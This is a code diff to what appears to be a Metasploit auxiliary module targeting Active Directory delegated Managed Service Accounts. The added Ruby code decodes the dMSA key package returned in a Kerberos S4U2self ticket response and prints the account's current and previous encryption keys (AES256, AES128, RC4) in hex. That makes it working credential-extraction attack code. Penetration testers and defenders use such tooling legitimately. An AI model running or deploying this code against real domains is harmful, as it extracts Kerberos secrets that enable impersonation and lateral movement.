@@ -224,10 +224,24 @@ class MetasploitModule < Msf::Auxiliary
         nonce: nonce,
         dmsa: true
       }
-      tgs_ticket, _tgs_auth = authenticator.s4u2self(
+      tgs_ticket, tgs_auth = authenticator.s4u2self(
         credential,
         auth_options.merge(ticket_storage: kerberos_ticket_storage(read: false, write: true))
       )
+
+      # when Rex::Proto::Kerberos::Model::PreAuthType::DMSA_KEY_PACKAGE
+      # decoded = OpenSSL::ASN1.decode(self.value)
+      # DmsaKeyPackage.decode(decoded)
+      tgs_auth.pa_data.each do |pa_data|
+        if pa_data.type == Rex::Proto::Kerberos::Model::PreAuthType::DMSA_KEY_PACKAGE
+          dmsa_key_package = Rex::Proto::Kerberos::Model::DmsaKeyPackage.decode(pa_data.value)
+          print_dmsa_key_package_info(dmsa_key_package)
+
+        end
+        rescue ::Rex::Proto::Kerberos::Model::Error::KerberosDecodingError => e
+          print_error("#{peer} - Failed to decode dMSA Key Package: #{e.message}")
+          return
+      end
 
       # auth_options[:sname] = Rex::Proto::Kerberos::Model::PrincipalName.new(
       #   name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
@@ -270,6 +284,44 @@ class MetasploitModule < Msf::Auxiliary
       }
 
       authenticator.request_tgs_only(credential, tgs_options)
+    end
+  end
+
+  def print_dmsa_key_package_info(dmsa_key_package)
+    puts "dMSA Key Package:"
+
+    # Helper method to decode encryption type
+    def decode_encryption_type(type)
+      case type
+      when 18
+        "AES256"
+      when 17
+        "AES128"
+      when 23
+        "RC4"
+      else
+        "Unknown"
+      end
+    end
+
+    # Print current keys
+    puts "Current Keys:"
+    dmsa_key_package.current_keys.each do |key_set|
+      key_set.each do |key|
+        type = decode_encryption_type(key[0][0])
+        value = key[1][0]
+        puts "  Type: #{type}, Key: #{value.unpack1('H*')}"
+      end
+    end
+
+    # Print previous keys
+    puts "Previous Keys:"
+    dmsa_key_package.previous_keys.each do |key_set|
+      key_set.each do |key|
+        type = decode_encryption_type(key[0][0])
+        value = key[1][0]
+        puts "  Type: #{type}, Key: #{value.unpack1('H*')}"
+      end
     end
   end
 
